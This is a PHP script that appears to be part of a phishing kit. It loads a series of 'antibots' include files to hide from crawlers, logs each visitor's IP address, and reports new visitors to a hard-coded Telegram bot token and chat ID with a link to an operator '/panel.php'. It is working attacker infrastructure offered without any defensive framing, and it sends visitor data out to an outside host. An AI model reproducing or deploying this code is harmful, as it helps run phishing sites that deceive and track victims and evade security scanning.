
<?php
include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';
$ip = $_SERVER['REMOTE_ADDR'];
$file = 'notified_ips.json';
$already = file_exists($file) ? json_decode(file_get_contents($file), true) : [];

if (isset($already[$ip])) {
    return; // IP déjà notifiée
}

// Enregistrement
$already[$ip] = time();
file_put_contents($file, json_encode($already, JSON_PRETTY_PRINT));

// Infos Telegram
$token = '7726379618:AAEKmunbiAyZSH5Rs-oiTdPUHM6p1Xa6Bb4';
$chat_id = '8134069302';

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
$host = $_SERVER['HTTP_HOST'];
$url = $protocol . $host . '/panel.php';

$message = "⚠️ *Nouveau visiteur détecté !*\n\n🌐 IP : `$ip`\n\n🔗 Lien vers le panel :\n`$url`\n\n👉 [Ouvrir le panel]($url)";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown',
    'disable_web_page_preview' => true
]));
